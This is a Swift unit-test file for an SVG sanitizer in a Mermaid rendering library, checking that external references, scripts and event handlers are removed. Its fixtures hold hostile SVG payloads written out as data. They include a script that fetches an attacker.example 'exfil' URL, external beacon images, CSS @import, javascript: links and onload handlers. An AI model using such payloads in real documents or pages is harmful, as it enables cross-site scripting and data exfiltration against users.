// SVGSanitizerTests.swift
// MermaidRenderKitTests

import XCTest

@testable import MermaidRenderKit

/// Phase 7 / Task 10 egress sanitizer gate (PRD §4.7a / §5.2 / T5/T11;
/// CWE-20/79/918). The vector path must neutralize every non-`data:` external
/// reference, `<script>`, and event handler before the SVG reaches SVGView.
final class SVGSanitizerTests: XCTestCase {

    /// One crafted diagram carrying ALL attack vectors at once (PRD T11):
    /// `<image href=https>` + `<image xlink:href=https>` (both attr forms) +
    /// external `<use xlink:href=https…#id>` + CSS `url(https…)` in a `style`
    /// attr AND in a `<style>` block + `<script>` + `onclick`.
    private let hostileSVG = """
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 50">
      <style>.bg { fill: url(https://attacker.example/tracker.svg#g); }</style>
      <script>fetch('https://attacker.example/exfil')</script>
      <image href="https://attacker.example/beacon1.png" width="10" height="10"/>
      <image xlink:href="https://attacker.example/beacon2.png" width="10" height="10"/>
      <use xlink:href="https://attacker.example/sprite.svg#icon"/>
      <rect width="100" height="50" onclick="alert(1)" style="fill: url(https://attacker.example/x.png)"/>
      <image href="data:image/png;base64,AAAA" width="10" height="10"/>
      <use xlink:href="#localGradient"/>
    </svg>
    """

    func testHostileSVGHasNoSurvivingExternalReference() {
        let out = SVGSanitizer.sanitize(hostileSVG)

        // Every injected vector used this host — none may survive. (The `xmlns`
        // namespace URIs are identifiers, not fetchable resources, and are
        // correctly left intact, so we assert on the exfil host, not on bare
        // "http://", which would false-positive on `xmlns="http://www.w3.org…"`.)
        XCTAssertFalse(out.contains("attacker.example"), "external host leaked: \(out)")

        // No script, no event handler.
        XCTAssertFalse(out.lowercased().contains("<script"))
        XCTAssertFalse(out.lowercased().contains("onclick"))

        // No non-data url() token survives.
        XCTAssertFalse(out.lowercased().contains("url(http"))
    }

    func testDataImageAndLocalFragmentSurvive() {
        let out = SVGSanitizer.sanitize(hostileSVG)
        // Legitimate, egress-free references must be preserved.
        XCTAssertTrue(out.contains("data:image/png;base64,AAAA"), "data: image was dropped")
        XCTAssertTrue(out.contains("#localGradient"), "local fragment <use> was dropped")
    }

    func testScriptWithAttributesAndSelfClosingRemoved() {
        let svg = #"<svg><script type="text/javascript">x()</script><script src="https://e/x.js"/></svg>"#
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertFalse(out.lowercased().contains("<script"))
        XCTAssertFalse(out.contains("https://e/x.js"))
    }

    func testNonDataImageHrefNeutralizedBothAttributeForms() {
        let svg = #"<svg><image href="http://e/a.png"/><image xlink:href="//e/b.png"/></svg>"#
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertFalse(out.contains("e/a.png"))
        XCTAssertFalse(out.contains("e/b.png"))
    }

    func testExternalUseNeutralizedLocalUseKept() {
        let svg = ##"<svg><use href="https://e/s.svg#i"/><use xlink:href="#keep"/></svg>"##
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertFalse(out.contains("e/s.svg"))
        XCTAssertTrue(out.contains("#keep"))
    }

    func testEventHandlersStrippedAcrossQuotingStyles() {
        let svg = #"<svg><rect onload='a()' onClick="b()" ONMOUSEOVER="c()"/></svg>"#
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertFalse(out.lowercased().contains("onload"))
        XCTAssertFalse(out.lowercased().contains("onclick"))
        XCTAssertFalse(out.lowercased().contains("onmouseover"))
    }

    // MARK: - Hardening added after the Round-1 audit

    func testAnchorClickHrefNeutralized() {
        // Mermaid `click NodeId "URL"` emits <a href="URL">; external + javascript:
        // targets must be dropped, local #fragment kept (CWE-601/918/79).
        let svg = ##"<svg><a href="https://evil.example/x"><rect/></a><a xlink:href="javascript:alert(1)"/><a href="#node1"/></svg>"##
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertFalse(out.contains("evil.example"))
        XCTAssertFalse(out.lowercased().contains("javascript:"))
        XCTAssertTrue(out.contains("#node1"), "local fragment anchor preserved")
    }

    func testUnquotedEventHandlerStripped() {
        let out = SVGSanitizer.sanitize("<svg><rect onload=alert(1) onclick=steal()/></svg>")
        XCTAssertFalse(out.lowercased().contains("onload"))
        XCTAssertFalse(out.lowercased().contains("onclick"))
    }

    func testCSSImportInStyleBlockStripped() {
        let svg = #"<svg><style>@import "https://evil.example/x.css"; .a{fill:red}</style></svg>"#
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertFalse(out.contains("evil.example"))
        XCTAssertFalse(out.lowercased().contains("@import"))
    }

    func testFeImageExternalHrefNeutralized() {
        let svg = #"<svg><filter><feImage href="https://evil.example/x.png"/></filter></svg>"#
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertFalse(out.contains("evil.example"))
    }

    func testForeignObjectStripped() {
        let svg = #"<svg><foreignObject><body onload="x()">hi</body></foreignObject></svg>"#
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertFalse(out.lowercased().contains("<foreignobject"))
        XCTAssertFalse(out.lowercased().contains("onload"))
    }

    func testDataTextHtmlAndDataSvgImageRejected() {
        // `data:` is not a blanket allow: only data:image/* (non-svg) survives.
        let svg = #"<svg><image href="data:text/html,<script>alert(1)</script>"/><image xlink:href="data:image/svg+xml,<svg onload=x>"/></svg>"#
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertFalse(out.lowercased().contains("data:text/html"))
        XCTAssertFalse(out.lowercased().contains("data:image/svg+xml"))
    }

    func testBareOpenScriptStripped() {
        let out = SVGSanitizer.sanitize(#"<svg><script src="https://evil.example/x.js"></svg>"#)
        XCTAssertFalse(out.lowercased().contains("<script"))
        XCTAssertFalse(out.contains("evil.example"))
    }

    func testCleanSVGPassesThroughUnchangedInSubstance() {
        // A benign mmdr-style SVG must keep its geometry and data: image.
        let svg = """
        <svg viewBox="0 0 200 100"><rect width="200" height="100" fill="#fff"/>\
        <image href="data:image/png;base64,QQ==" width="20" height="20"/>\
        <text x="5" y="20">A--&gt;B</text></svg>
        """
        let out = SVGSanitizer.sanitize(svg)
        XCTAssertTrue(out.contains("viewBox=\"0 0 200 100\""))
        XCTAssertTrue(out.contains("data:image/png;base64,QQ=="))
        XCTAssertTrue(out.contains("A--&gt;B"))
    }
}
